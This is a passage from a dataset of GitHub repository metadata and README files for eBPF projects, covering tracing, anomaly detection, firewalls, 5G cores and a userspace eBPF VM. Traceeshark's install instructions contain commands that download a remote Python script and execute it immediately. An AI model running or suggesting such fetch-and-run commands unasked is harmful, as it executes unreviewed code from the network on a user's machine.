>Osaki, Atsuya, Poisson, Manuel, Makino, Seiki, Shiiba, Ryusei, Fukuda, Kensuke, Okoshi, Tadashi, & Nakazawa, Jin. (2024, August). Dynamic Fixed-point Values in eBPF: a Case for Fully In-kernel Anomaly Detection. In Proceedings of the Asian Internet Engineering Conference 2024 (pp. 46-54).

## Components of this Repository
The below list is the main components of this repository.
1. fully_in-kernel directory
2. user+ebpf directory
3. fixed-point.h header file

The 2 directories contain 2 different versions of the anomaly detection/mitigation framework. 
fully_in-kernel directory composes the fully in-kernel version, and the user+ebpf directory composes the version that perform traffic analysis in the user space.

fixed-point.h file contains the arithmetic operations of the dynamic fixed-point values, which allows arithmetic operations of fractional numbers inside eBPF programs. Refer to our paper for more details. To use this library, place this ""fixed-point.h"" header file inside the directory of your project and reference it as a headerfile inside your eBPF program.

## To build the framework
The basic introduction of XDP is well composed by the people at XDP-Project, inside the [xdp-tutorial](https://github.com/xdp-project/xdp-tutorial) repository. Dependency of FIDe can also be fulfilled by following the introduction of xdp-tutorial, found [here](https://github.com/xdp-project/xdp-tutorial/blob/master/setup_dependencies.org).

When that is done, move to the directory of the framework (fully_in-kernel/ or user+ebpf/) and then inside main/ directory. Run `make` there, then the libraries and eBPF programs will be compiled. Use xdp-loader from xdp-tutorial to load the eBPF program to the kernel space.
"
coranlabs/hexaebpf,19,6,19,1,Mustache,The Future of Interoperable eBPF Defined 5G Core (eDC),2024-05-04T03:08:58Z,2025-08-12T09:47:37Z,27,"
# **HEXAeBPF: The Future of Interoperable eBPF Defined 5G Core (eDC)**
*Empowering the next generation of 5G core deployments with simplicity, interoperability, and automation.*

---

## **Introduction**
HEXAeBPF is a Kubernetes (K8s) Operator designed to redefine how open-source 5G core networks are deployed and managed. By integrating and automating the deployment of Control Plane (CP) from Vendor A and eBPF-based User Plane (UP) from Vendor B, HEXAeBPF enables seamless, end-to-end 5G lab setups with minimal effort.
Whether you're a telecom researcher, developer, or operator, HEXAeBPF simplifies deployment processes, fosters interoperability, and accelerates the evolution of 5G core networks.

---

## **Key Features**
- **Interoperable 5G Core Solution:** Integrates CP from one vendor with UP from another, offering unparalleled flexibility.
- **Zero Effort Deployment:** Automates deployment with no prior technical knowledge required.
- **One-Click Deployment (OCD):** A single command sets up the entire 5G core solution.
- **Interactive CLI:** User-friendly terminal interface for configuration and management.
- **E2E Connectivity:** Full integration with RAN simulators for end-to-end testing.
- **Open Source Accessibility:** Promotes collaboration and innovation in the telecom industry.

---

## **Advantages**
1. **Interoperability:** Modular design allows seamless integration between various open-source CP and eUP components.
2. **Efficiency and Speed:** eBPF-based UPF optimizes performance, while one-click deployment drastically reduces setup time.
3. **Future-Ready:** Aligns with the dynamic nature of 5G, ensuring adaptability to modern network demands.
4. **Open Source Collaboration:** A community-driven approach fosters continuous innovation in 5G core solutions.

---

## **Why HEXAeBPF is Built as a Kubernetes Operator?**
Kubernetes Operators are ideal for automated, scalable, and flexible management. HEXAeBPF leverages this technology to provide:
- **Custom Resource Definitions (CRDs):** Simplified configuration of CP and eUP components.
- **Automated Lifecycle Management:** Handles scaling, updates, and self-healing tasks seamlessly.
- **Consistency and Reliability:** Ensures uniform deployment and management across diverse environments.
- **Reduced Complexity:** Abstracts complex networking and configuration challenges.

---

## **How HEXAeBPF Works**
1.	Choose your desired Control Plane.
2.	Select a compatible eBPF-based User Plane that works seamlessly with your chosen Control Plane.
3.	Pick the supported RAN Simulator for end-to-end testing.
4.	Tada! Thatâ€™s all you need to doâ€”your E2E deployment will be ready within minutes!

---

## **Deployment**
Simplified deployment is the cornerstone of HEXAeBPF. Use the following command for an interactive CLI experience:

```bash
git clone https://github.com/coranlabs/HEXAeBPF.git ~/
cd ~/HEXAeBPF
make run_hexaebpf
```

*CLI Demo:*

<div align=""left"">
  <img src=""./images/hexaebpf_cli_demo.gif"" alt=""HEXAeBPF CLI Demo"" width=""600"" height=""400"">
</div>

---

## **Supported Topologies**
### **Combined Phases**
| Control Plane       | User Plane           | RAN Simulator  |
|---------------------|----------------------|----------------|
| Aether SD Core             | edgecomllc/eUPF     | UERANSIM       |
| Free5gc             | edgecomllc/eUPF     | UERANSIM       |
| Open5GS             | edgecomllc/eUPF     | UERANSIM       |
| OAI                 | OAI-UPF-eBPF        | OAI-RFSimulator|
| Aether SD Core             | OAI-UPF-eBPF        | UERANSIM       |
| Free5gc             | OAI-UPF-eBPF        | UERANSIM       |
| Open5GS             | OAI-UPF-eBPF        | UERANSIM       |
| OAI                 | edgecomllc/eUPF     | OAI-RFSimulator|
| Aether SD Core             | e3-UPF              | UERANSIM       |
| Free5gc             | e3-UPF              | UERANSIM       |
| Open5GS             | e3-UPF              | UERANSIM       |
| OAI                 | e3-UPF              | UERANSIM       |

---

## **Vision**
HEXAeBPF is more than an operator; it's a gateway to:
- **Flexible 5G Core Design:** Empower users to build custom CP and UP solutions effortlessly.
- **Industry Innovation:** Promote 5G awareness and adoption in labs and enterprises.
- **Future Connectivity:** Foster collaboration and open-source development in 5G telecom ecosystems.

---

## **Contribute**
HEXAeBPF is a community-driven project, and your contributions are welcome! Whether youâ€™re a developer, researcher, or network operator, join us in shaping the future of 5G core networks.

### **How to Contribute**
1. Fork the repository.
2. Create a new branch for your feature/bugfix.
3. Submit a pull request with detailed information about your changes.

---

## **Tutorial and Documentation**
- **Coming in Future Releases:**
  <!-- - HEXAeBPF blog for tutorials and updates.
  - Video demonstrations for hexa operator functionalities. -->

---

## **License**
This project is licensed under **AGPL-3.0 License**. See [LICENSE](../LICENSE.md) for more details.

### Licensing Notice
HEXAeBPF integrates the following open-source components:
- Open5GS (AGPL-3.0): Requires HEXAeBPF to comply with AGPL-3.0.
- Free5GC, eupf, SD-Core (Apache 2.0): These components impose permissive conditions.
- OAI (OAI Public License v1.1): Limited to research/study unless separately negotiated.

Users must ensure compliance with these licenses when using HEXAeBPF. Check [here](./THIRD_PARTY_LICENSES.md) to know more.

---

## **Code of Conduct**
HEXAeBPF adheres to the [GitHub Open Source Code of Conduct](../.github/CODE_OF_CONDUCT.md). By contributing, you agree to uphold this standard.
"
elastic/tk-btf,6,3,6,0,Go,,2023-12-04T17:25:11Z,2025-08-11T20:42:49Z,11,"# Tracing KProbes from BTF (tk-btf)
[![Build status](https://badge.buildkite.com/127fe118a0ca01517075701041070b66e1a6c27322132658db.svg)](https://buildkite.com/elastic/tk-btf)

`tk-btf` is a Go package to fabricate the string representation of [Linux tracing kprobes](https://docs.kernel.org/trace/kprobetrace.html#usage-examples) based on [BTF](https://docs.kernel.org/bpf/btf.html) files.

## Quick Start

To try out `tk-btf` have a look at the [examples](examples) folder.

## License

This software is licensed under the Apache License, version 2 (""ALv2""), quoted below.

Copyright 2023-2024 Elasticsearch <https://www.elastic.co>

Licensed under the Apache License, Version 2.0 (the ""License""); you may not
use this file except in compliance with the License. You may obtain a copy of
the License at

> http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
License for the specific language governing permissions and limitations under
the License.

This repository includes dependencies/submodules whose licenses are listed in [LICENSE.txt](LICENSE.txt)."
chayuto/tetragon-playground,2,0,2,0,Python,Tetragon Playground,2024-07-11T01:01:15Z,2024-07-24T06:00:58Z,35,"# Tetragon Playground ðŸðŸ›¡ï¸
A bit unconventional way to start some Tetragon fun with `docker compose`, no kubernete or helm needed.

## Getting starts

### TCP connection policy example
- log tcp event with `policies/connect.yaml`
- parse into csv with `log_parser/tcp_connection.py`

### Adjusting custom configuration file
file: `./my_tetragon_config.yaml`

find more info on [Daemon configuration](https://tetragon.io/docs/reference/daemon-configuration/)

## Docker compose way
```bash 
sudo docker compose -f docker-compose.yaml up -d
```

#### Inspect the Tetragon container
```bash
sudo docker exec -it tetragon-container bash
```

#### View events
```bash
sudo docker exec tetragon-container tetra getevents -o compact
```"
itsCheithanya/eBPF-XDP-ML-Firewall,3,2,3,0,C, Integration of machine learning (ML) to eBPF-based packet filtering. Leveraging eXpress Data Path (XDP)  method to incorporate ML models with floating-point weights into eBPF,2024-06-27T14:41:53Z,2025-06-16T19:02:28Z,1,"This project presents an innovative approach to enhancing network security through the integration of machine learning (ML) with eBPF-based packet filtering. Leveraging eXpress Data Path (XDP) technology, our solution enables the early detection and filtering of malicious packets at the network interface level, significantly reducing processing time and CPU overhead. We propose a novel method to incorporate ML models with floating-point weights into eBPF programs, overcoming the limitations imposed by eBPF's lack of support for floating-point arithmetic. Our design consists of an eBPF-based firewall attached to a network interface via XDP, which filters incoming packets based on user-defined rules and predictions from a Logistic Regression Model identifying blacklisted IP addresses. Evaluation results demonstrate the superior throughput performance of our kernel space firewall compared to traditional user-space firewalls. This research opens avenues for optimizing eBPF support for advanced ML techniques and underscores the importance of early detection in fortifying network security against evolving threats.
"
atomic77/nethadone,10,0,10,0,C,An adaptive eBPF-based router built to discourage network users from compulsive web usage,2024-05-02T01:27:17Z,2024-12-10T12:56:11Z,26,"# Nethadone

Nethadone is an adaptive L4 router built to discourage and train users on a network
out of compulsive or addictive web usage.

It uses [eBPF](https://ebpf.io/) to efficiently monitor and dynamically adjust traffic
speeds
to gently nudge users off of configured sites. The goal is to
get the benefit of these platforms (occasional surfing, ability to respond to messages, 
etc.) while avoiding the downsides of excessive use.


## Getting Started

Nethadone is in active development and has been tested on the following devices:

* [Orange Pi R1 Plus](http://www.orangepi.org/html/hardWare/computerAndMicrocontrollers/details/orange-pi-R1-Plus.html)
* [Orange Pi R1](http://www.orangepi.org/html/hardWare/computerAndMicrocontrollers/details/Orange-Pi-R1.html)
* [Orange Pi Zero](http://www.orangepi.org/html/hardWare/computerAndMicrocontrollers/details/Orange-Pi-Zero-LTS.html)

Please check out [doc/install.md](doc/install.md) for more details.

For development or testing on a local VM, please see 
[doc/development.md](doc/development.md)

## How does it work? 

Nethadone leverages several eBPF programs to monitor and classify
routed traffic as it passes through. Based on the configured
policies, packets are slotted into a series of bandwidth classes.
The default configuration corresponds roughly to:

* Full throttle (no restriction)
* Decent DSL connection
* Good 4G connection
* Flaky 3G connection
* A top of the line US Robotics 56K modem

As a user continues to compulsively use a given site, traffic 
to flagged IPs gradually works its way down the list above.

Nethadone currently only supports a single policy, for more details
see [policy/README.md](policy/README.md).

For more details on bandwidth classes (i.e. qdisc configuration), see [doc/qdisc.md](doc/qdisc.md).

### Traffic flow

The following diagram shows the approximate life of a packet as
it flows through the nethadone router, and 
most of the moving parts involved:

![overview](doc/nethadone-overview.png)
## Design Goals

* Protect all devices in a network with zero client-side configuration or software
* Dynamically throttle traffic from clients to configurable sites or groups of sites to ""train"" good habits
* Use only IP and (sniffed) DNS (i.e. as close to a pure L4 solution as possible)
* Introduce no latency on ""good"" traffic
* Usable on minimal hardware like an Orange Pi R1plus or similar

## Current milestones 

Milestone 8: Improved overall installation experience and support
for lower-end 32-bit arm devices such as Orange Pi Zero/R1.

## References & Acknowlegements

### Projects

A number of projects were invaluable reference points
in trying to understand the intracies of eBPF:

* [Dae](https://github.com/daeuniverse/dae/)
* [Flat](https://github.com/pouriyajamshidi/flat)
* [Grafana Beyla](https://github.com/grafana/beyla)

While a very different technical solution, the product experience of [Pi-hole](https://github.com/pi-hole/pi-hole) from the users' persective is a huge inspiration for nethadone.


### Papers and Books

[Learning eBPF - Full Book](https://cilium.isovalent.com/hubfs/Learning-eBPF%20-%20Full%20book.pdf)

[Replacing HTB with EDT and BPF](https://netdevconf.info//0x14/pub/papers/55/0x14-paper55-talk-paper.pdf)

[Scaling Linux Traffic
Shaping with BPF](http://vger.kernel.org/lpc_bpf2018_talks/lpc-bpf-2018-shaping.pdf)


[Understanding tc â€œdirect actionâ€ mode for BPF](https://qmonnet.github.io/whirl-offload/2020/04/11/tc-bpf-direct-action/)

[Linux Advanced Routing & Traffic Control HOWTO](https://lartc.org/lartc.html)"
0xSh4dy/bee_tracer,30,6,30,0,C,,2024-07-30T13:14:12Z,2025-10-02T12:46:17Z,2,
evanrolfe/trayce_agent,67,2,67,0,Go,,2023-05-19T07:49:26Z,2025-09-12T07:41:18Z,358,"# TrayceAgent
![](https://img.shields.io/badge/Go-1.23-blue)  [![ebpf.io](https://img.shields.io/badge/ebpf-yellow)](https://ebpf.io/) [![trayce.dev](https://img.shields.io/badge/Website-orange)](https://trayce.dev/)

TrayceAgent is a binary executable, packaged in a Docker container, which uses EBPF to monitor network requests between Docker containers and to external hosts. It can be used along with the [TrayceGUI](https://github.com/evanrolfe/trayce_gui/) to inspect traffic.

Read the [docs](https://github.com/evanrolfe/trayce_agent/tree/main/docs) for implementation details.

### Build

1. Build an image for local-use (only) with:
```
docker build -t trayce_agent:local .
```

2. Run the built container, replacing `-s` with the address of your GRPC server for receiving network flows (i.e. from TraceGUI).
```
docker run --pid=host --privileged -v /var/run/docker.sock:/var/run/docker.sock -it trayce_agent:local -s 192.168.0.1:50052
```

### Develop
Run the bash on the build container with a volume so you can make changes, rebuild and run trayce_agent easily. First comment out the final build stage of the Dockerfile, and change the entrypoint to `bash` then build it to `trayce_agent:local` and run:
```
make dev
```
Then from within the container run:
```
make
./trayce_agent -s 192.168.0.20:50052
```
(You must have a GRPC server running at 192.168.0.20:50052, you can do that by starting the GUI).

### Test
First ensure the megaserver is running:
```
docker compose up megaserver
```

Run tests from within the build container (from the ""Develop"" step):
```
START_AGENT=true make test
```

Run load tests:
```
START_AGENT=true make testload
```

Run unit tests:
```
make testunit
```

Generate mocks with `mockery` (`go install github.com/vektra/mockery/v2@v2.43.2`).
"
dorkamotorka/ebpf-map-metrics,24,0,24,0,C,eBPF Map Prometheus Exporter,2024-07-29T07:05:09Z,2025-08-26T01:40:30Z,41,"# eBPF Map Metrics Prometheus Exporter

This project exports eBPF Map Pressure and elements count as Prometheus metrics.

**NOTE**: Certain eBPF Maps are fixed-sized and don't maintain a counter of elements internally. For those the values of elements is equal to the max number of entries specified for that map.

## Development Status

This project is currently under development.

It requires `6.6+` Linux Kernel, due to `bpf_map_sum_elem_count` kfunc.

![Infra-9](https://github.com/user-attachments/assets/de0a70c1-1fbb-498c-b3de-80c1d1c0bf7b)

## eBPF Iterators

eBPF Iterators are a powerful feature that allows developers to iterate over kernel data structures efficiently. 
They facilitate detailed inspection and analysis by enabling safe traversal of complex data structures, 
making it easier to collect metrics, debug, and perform various monitoring tasks within the kernel space (and send it back to the user space).
"
aquasecurity/traceeshark,293,19,293,1,C,Deep Linux runtime visibility meets Wireshark,2024-05-30T08:36:59Z,2025-10-04T15:58:24Z,339,"![](docs/img/traceeshark_color.png#gh-light-mode-only)
![](docs/img/traceeshark_white.png#gh-dark-mode-only)

1. [What is Traceeshark?](#what-is-traceeshark)

2. [Getting started](#getting-started)

3. [Basic usage](#basic-usage)

4. [Build from source](#build-from-source)

## What is Traceeshark?

Traceeshark brings the world of Linux runtime security monitoring and advanced system tracing to the familiar and ubiquitous network analysis tool Wireshark.

Using Traceeshark, you can load [Tracee](https://github.com/aquasecurity/tracee) captures in JSON format into Wireshark, and analyze them using Wireshark's advanced display and filtering capabilities.

![](docs/img/example.png)

Traceeshark also provides the ability to analyze system events side by side with network packets generated by Tracee that contain rich context about the system process and container they belong to.

Another feature of Traceeshark is the ability to capture events using Tracee directly from Wireshark and have them stream in like a network capture. This can be done either locally on a Linux machine running Wireshark, semi-locally using docker desktopâ€™s VM on Windows and Mac, or even remotely over SSH.

For an overview of Traceeshark and an example of how it can be used for malware analysis, you can read [Go deeper: Linux runtime visibility meets Wireshark](https://www.aquasec.com/blog/go-deeper-linux-runtime-visibility-meets-wireshark/).

## Getting started

The simplest way to install Traceeshark is using the autoinstall script.

First, make sure you have Python 3 installed, and your Wireshark installation is updated to the latest version.

Then, simply run the following command:

**Windows (powershell)**

```powershell
$outFile = [System.IO.Path]::GetTempFileName() ; Invoke-WebRequest -Uri ""https://raw.githubusercontent.com/aquasecurity/traceeshark/main/autoinstall.py"" -OutFile $outFile ; python.exe $outFile ; rm $outFile
```

**Linux/Mac**

```bash
outfile=$(mktemp) && curl -s ""https://raw.githubusercontent.com/aquasecurity/traceeshark/main/autoinstall.py"" > $outfile && python3 $outfile && rm $outfile
```

:information_source: Note that Traceeshark is compiled for a specific Wireshark verison. If you are using a Linux distribution with an outdated Wireshark package, the prebuilt releases of Traceeshark may not work. Ubuntu 22.04 and 24.04 have a dedicated release for their Wireshark package version.

### Setup for live capture

To use live capture, Python 3 must be installed and in your PATH, and a few libraries must be installed:

```
pip3 install paramiko msgpack python-pcapng
```

Additionally, the user must be able to run docker containers.

:information_source: This requirement is also applicable to remote servers you want to capture on, make sure the user you log in with can run docker.

On Linux, add your user to the docker group:

```bash
sudo usermod -aG docker <user>
```

On Windows and Mac, make sure docker desktop is installed and your user can run containers.

:warning: Do not run Wireshark as root instead of adding your user the the docker group. Running Wireshark as root is strongly discouraged, and Wireshark prevents binary plugins from loading when running as root.

### Manual installation

Traceeshark can be installed using a [release](https://github.com/aquasecurity/traceeshark/releases/latest) archive containing the plugins and other required files.

Each release archive targets a specific Wireshark version and may not work with other versions. Download the appropriate release, unzip it, and run the installation script from the command line (`install.ps1` on Windows and `install.sh` on Linux/Mac)

:warning: Make sure you're in the same directory as the installation script when running it

Now the plugins should be available to your Wireshark installation.

### Verifying that the plugins were loaded

To make sure that the plugins were loaded, in Wireshark open ***Help -> About***, select the ***Plugins*** tab, and verify that the following 4 plugins are present:

- `tracee-capture`

- `tracee-event`

- `tracee-json`

- `tracee-network-capture`

Alternatively, run `tshark -G plugins` and the plugins should be in the output.

If the `tracee-capture` plugin does not appear, this means that you haven't set up Python 3 with the correct libraries, see [Setup for live capture](#setup-for-live-capture). If any of the other plugins is not loaded, make sure that the release you installed matches your Wireshark version, and if it does please open an [issue](https://github.com/aquasecurity/traceeshark/issues).

## Basic usage

When using Traceeshark for the first time, the Tracee configuration profile should be applied. The profile defines the custom column view, the event colors and some quick-filter buttons. Go to ***Edit -> Configuration Profiles...*** and select the ***Tracee*** profile.

After that, any file containing Tracee events in JSON format can be loaded into Wireshark, or the live capture feature can be used to capture Tracee events directly from Wireshark.

If you know how to use Wireshark, using Traceeshark should be natural. If you don't have experience with Wireshark, you can read the [User Guide](https://www.wireshark.org/docs/wsug_html_chunked/), in particular [ChapterÂ 3.Â User Interface](https://www.wireshark.org/docs/wsug_html_chunked/ChapterUsing.html) and [ChapterÂ 6.Â Working With Captured Packets](https://www.wireshark.org/docs/wsug_html_chunked/ChapterWork.html) are useful.

To use Traceeshark effectively, it is recommended to familiarize yourself with [Tracee](https://aquasecurity.github.io/tracee/latest/). If you are only planning to use Traceeshark's live capture feature, there is no need to learn how to use Tracee's command line.

Most of Traceeshark's features are easy to explore by yourself. For a comprehensive explanation about all features, see [docs/features.md](docs/features.md).

## Build from source

See [docs/build.md](docs/build.md).
"
tzussman/kmodleak,45,1,45,5,C,Track memory leaks for Linux kernel modules using eBPF,2023-07-14T23:39:29Z,2025-09-21T11:39:22Z,59,"# kmodleak

[![Github Actions](https://github.com/tzussman/kmodleak/actions/workflows/build.yml/badge.svg)](https://github.com/tzussman/kmodleak/actions/workflows/build.yml)

`kmodleak` is an eBPF tool for tracing Linux kernel module memory leaks.
For full functionality, it requires loading and unloading the target module
while it is running. It does NOT load or unload modules itself. Once the module
is unloaded, `kmodleak` will automatically terminate and display a summary of
any detected memory leaks.

#### Credits

*The infrastructure in this repo was taken from
[libbpf-bootstrap](https://github.com/libbpf/libbpf-bootstrap/).*
*`kmodleak`'s design is inspired by and based on
[`memleak`](https://github.com/iovisor/bcc/blob/master/libbpf-tools/memleak.c)
from BCC.*
*`kmodleak` was also inspired by [`KEDR`](https://github.com/euspectre/kedr) and
is intended to serve as a lightweight replacement for its memory leak detector.*

## Setup

### Install Dependencies

You will need `clang` (at least v12 or later), `libelf` and `zlib` to build
the examples, package names may vary across distros.

On Ubuntu/Debian, you need:
```shell
$ apt install clang libelf1 libelf-dev zlib1g-dev
```

On CentOS/Fedora, you need:
```shell
$ dnf install clang elfutils-libelf elfutils-libelf-devel zlib-devel
```

If your distribution does not offer a recent enough version of `clang`, see
the automatic installation script at [apt.llvm.org](https://apt.llvm.org/).

### Getting the source code

Download the git repository and check out submodules:
```shell
$ git clone --recurse-submodules https://github.com/tzussman/kmodleak
```

### Building

Makefile build:

```console
$ git submodule update --init --recursive       # check out libbpf
$ cd src
$ make
$ sudo ./kmodleak leak  # Module is loaded and unloaded by the user (not shown)
using page size: 4096
Tracing module memory allocs... Unload module (or hit Ctrl-C) to end
module 'leak' loaded
module 'leak' unloaded

1 stacks with outstanding allocations:
128 bytes in 1 allocations from stack
        addr = 0xffff00008ba60f00 size = 128
          0 [<ffff80000834df84>] kmalloc_trace+0xf0
          1 [<ffff80000834df84>] kmalloc_trace+0xf0
          2 [<ffff800032f2f060>] leak_init+0x34
          3 [<ffff800008074dd0>] do_one_initcall+0x60
          4 [<ffff8000081b3404>] do_init_module+0x50
          5 [<ffff8000081b5458>] load_module+0x1cb8
          6 [<ffff8000081b5c7c>] __do_sys_finit_module+0xac
          7 [<ffff8000081b5d88>] __arm64_sys_finit_module+0x28
          8 [<ffff800008089bd8>] invoke_syscall+0x78
          9 [<ffff800008089cac>] el0_svc_common.constprop.0+0x4c
         10 [<ffff800008089d88>] do_el0_svc+0x34
         11 [<ffff800008d03794>] el0_svc+0x34
         12 [<ffff800008d04cd4>] el0t_64_sync_handler+0xf4
         13 [<ffff800008071548>] el0t_64_sync+0x18c
done
```

## Usage

`kmodleak` monitors kernel module memory allocations and detects leaks. The typical workflow is:

1. **Start kmodleak** - Run `kmodleak` with the module name you want to monitor
2. **Load the module** - In another terminal, load your kernel module with `insmod`
3. **Use the module** - Exercise your module's functionality  
4. **Unload the module** - Remove the module with `rmmod`
5. **View results** - `kmodleak` automatically exits and shows any detected leaks

### Basic Example

**Terminal 1** - Start monitoring:
```console
$ sudo ./kmodleak mymodule
using page size: 4096
Tracing module memory allocs... Unload module (or hit Ctrl-C) to end
```

**Terminal 2** - Load, use, and unload your module:
```console
$ sudo insmod mymodule.ko
$ # Exercise your module's functionality
$ sudo rmmod mymodule
```

**Terminal 1** - Results appear automatically:
```console
module 'mymodule' loaded
module 'mymodule' unloaded

1 stacks with outstanding allocations:
128 bytes in 1 allocations from stack
        addr = 0xffff00008ba60f00 size = 128
          0 [<ffff80000834df84>] kmalloc_trace+0xf0
          1 [<ffff80000834df84>] kmalloc_trace+0xf0
          2 [<ffff800032f2f060>] mymodule_init+0x34
          ...
done
```

The repository includes a couple sample modules for testing under the `mod`
directory.

### Installation

TODO

## Troubleshooting

libbpf debug logs are quite helpful to pinpoint the exact source of problems,
so it's usually a good idea to look at them before starting to debug or
posting question online.

For `./kmodleak`, run it in verbose mode (`-v`) to see libbpf debug logs:

```console
$ sudo ./kmodleak -v leak
using page size: 4096
libbpf: loading object 'kmodleak_bpf' from buffer
libbpf: elf: section(2) .symtab, size 2400, link 1, flags 0, type=2
libbpf: elf: section(3) .text, size 600, link 0, flags 6, type=1
libbpf: sec '.text': found program 'validate_stack' at insn offset 0 (0 bytes), code size 75 insns (600 bytes)
libbpf: elf: section(4) raw_tracepoint/module_load, size 808, link 0, flags 6, type=1
libbpf: sec 'raw_tracepoint/module_load': found program 'kmodleak__module_load' at insn offset 0 (0 bytes), code size 101 insns (808 bytes)
libbpf: elf: section(5) kretprobe/load_module, size 208, link 0, flags 6, type=1
...
```
"
eunomia-bpf/llvmbpf,101,8,101,2,C++,Userspace/GPU eBPF VM with llvm JIT/AOT compiler,2024-08-09T17:14:16Z,2025-10-12T10:42:18Z,36,"# Userspace eBPF VM with LLVM JIT/AOT Compiler

[![Build and Test VM](https://github.com/eunomia-bpf/llvmbpf/actions/workflows/test-vm.yml/badge.svg)](https://github.com/eunomia-bpf/llvmbpf/actions/workflows/test-vm.yml)
[![codecov](https://codecov.io/gh/eunomia-bpf/llvmbpf/graph/badge.svg?token=ZQXHpOwDa1)](https://codecov.io/gh/eunomia-bpf/llvmbpf)

A high-performance, multi-architecture JIT/AOT compiler and virtual machine (VM) based on LLVM.

This component is part of the [bpftime](https://github.com/eunomia-bpf/bpftime) project but focuses solely on the core VM. It offers the following capabilities:

- Operates as `a standalone eBPF VM library` or compiler tool.
- Compiles eBPF bytecode into LLVM IR files.
- Compiles eBPF ELF files into AOTed native code ELF object files, which can be linked like C-compiled objects or loaded into llvmbpf.
- Loads and executes AOT-compiled ELF object files within the eBPF runtime.
- Supports eBPF helpers and maps lddw functions.
- **GPU Execution Support**:
  - **PTX generation for NVIDIA CUDA GPUs**
  - **SPIR-V generation for cross-vendor GPUs** (Intel, AMD, NVIDIA, ARM) via OpenCL/Vulkan

This library is optimized for performance, flexibility, and minimal dependencies. It does not include maps implement, helpers, verifiers, or loaders for eBPF applications, making it suitable as a lightweight, high-performance library.

For a comprehensive userspace eBPF runtime that includes support for maps, helpers, and seamless execution of Uprobe, syscall trace, XDP, and other eBPF programsâ€”similar to kernel functionality but in userspaceâ€”please refer to the [bpftime](https://github.com/eunomia-bpf/bpftime) project.

- [Userspace eBPF VM with LLVM JIT/AOT Compiler](#userspace-ebpf-vm-with-llvm-jitaot-compiler)
  - [build project](#build-project)
  - [Usage](#usage)
    - [Use llvmbpf as a library](#use-llvmbpf-as-a-library)
    - [Use llvmbpf as a AOT compiler](#use-llvmbpf-as-a-aot-compiler)
    - [load eBPF bytecode from ELF file](#load-ebpf-bytecode-from-elf-file)
    - [Maps and data relocation support](#maps-and-data-relocation-support)
    - [Build into standalone binary for deployment](#build-into-standalone-binary-for-deployment)
    - [GPU Execution](#gpu-execution)
      - [PTX for NVIDIA CUDA GPUs](#ptx-for-nvidia-cuda-gpus)
      - [SPIR-V for Cross-Vendor GPUs](#spir-v-for-cross-vendor-gpus)
  - [optimizaion](#optimizaion)
    - [inline the maps and helper function](#inline-the-maps-and-helper-function)
    - [Use original LLVM IR from C code](#use-original-llvm-ir-from-c-code)
  - [Test](#test)
    - [Unit test](#unit-test)
    - [Test with bpf-conformance](#test-with-bpf-conformance)
  - [License](#license)

## build project

```sh
sudo apt install llvm-15-dev libzstd-dev
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --target all -j
```

## Usage

### Use llvmbpf as a library

See [example](example/main.cpp) of how to use the library as a vm:

```cpp
void run_ebpf_prog(const void *code, size_t code_len)
{
    uint64_t res = 0;
    llvmbpf_vm vm;

    res = vm.load_code(code, code_len);
    if (res) {
        return;
    }
    vm.register_external_function(2, ""print"", (void *)ffi_print_func);
    auto func = vm.compile();
    if (!func) {
        return;
    }
    int err = vm.exec(&bpf_mem, sizeof(bpf_mem), res);
    if (err != 0) {
        return;
    }
    printf(""res = %"" PRIu64 ""\n"", res);
}
```

### Use llvmbpf as a AOT compiler

Build with cli:

```sh
sudo apt-get install libelf1 libelf-dev
cmake -B build  -DBUILD_LLVM_AOT_CLI=1 
```

You can use the cli to generate the LLVM IR from eBPF bytecode:

```console
# ./build/cli/bpftime-vm build .github/assets/sum.bpf.o -emit-llvm > test.bpf.ll
# opt -O3 -S test.bpf.ll -opaque-pointers  -o test.opt.ll
# cat test.opt.ll
; ModuleID = 'test.bpf.ll'
source_filename = ""bpf-jit""

; Function Attrs: nofree norecurse nosync nounwind memory(read, inaccessiblemem: none)
define i64 @bpf_main(ptr %0, i64 %1) local_unnamed_addr #0 {
setupBlock:
  %2 = ptrtoint ptr %0 to i64
  %3 = load i32, ptr %0, align 4
  %4 = icmp slt i32 %3, 1
  br i1 %4, label %bb_inst_30, label %bb_inst_15

bb_inst_15:                                       ; preds = %setupBlock, %bb_inst_15
  %storemerge32 = phi i32 [ %11, %bb_inst_15 ], [ 1, %setupBlock ]
  %stackBegin29.sroa.2.031 = phi i32 [ %10, %bb_inst_15 ], [ 0, %setupBlock ]
  %5 = sext i32 %storemerge32 to i64
  %6 = shl nsw i64 %5, 2
  %7 = add i64 %6, %2
  %8 = inttoptr i64 %7 to ptr
  %9 = load i32, ptr %8, align 4
  %10 = add i32 %9, %stackBegin29.sroa.2.031
  %11 = add i32 %storemerge32, 1
  %12 = icmp sgt i32 %11, %3
  br i1 %12, label %bb_inst_30, label %bb_inst_15

bb_inst_30:                                       ; preds = %bb_inst_15, %setupBlock
  %stackBegin29.sroa.2.0.lcssa = phi i32 [ 0, %setupBlock ], [ %10, %bb_inst_15 ]
  %13 = zext i32 %stackBegin29.sroa.2.0.lcssa to i64
  ret i64 %13
}

attributes #0 = { nofree norecurse nosync nounwind memory(read, inaccessiblemem: none) }
```

AOT Compile a eBPF program:

```console
# ./build/cli/bpftime-vm build .github/assets/sum.bpf.o
[2024-08-10 14:54:06.453] [info] [main.cpp:56] Processing program test
[2024-08-10 14:54:06.479] [info] [main.cpp:69] Program test written to ./test.o
```

Load and run a AOTed eBPF program:

```console
# echo ""AwAAAAEAAAACAAAAAwAAAA=="" | base64 -d > test.bin
# ./build/cli/bpftime-vm run test.o test.bin
[2024-08-10 14:57:16.986] [info] [llvm_jit_context.cpp:392] LLVM-JIT: Loading aot object
[2024-08-10 14:57:16.991] [info] [main.cpp:136] Program executed successfully. Return value: 6
```

See [Build into standalone binary for deployment](#build-into-standalone-binary-for-deployment) for more details.

### load eBPF bytecode from ELF file

You can use llvmbpf together with libbpf to load the eBPF bytecode directly from `bpf.o` ELF file. For example:

```c
  bpf_object *obj = bpf_object__open(ebpf_elf.c_str());
  if (!obj) {
    return 1;
  }
  std::unique_ptr<bpf_object, decltype(&bpf_object__close)> elf(
    obj, bpf_object__close);

  bpf_program *prog;
  for ((prog) = bpf_object__next_program((elf.get()), __null);
       (prog) != __null;
       (prog) = bpf_object__next_program((elf.get()), (prog))) {
    const char *name = bpf_program__name(prog);
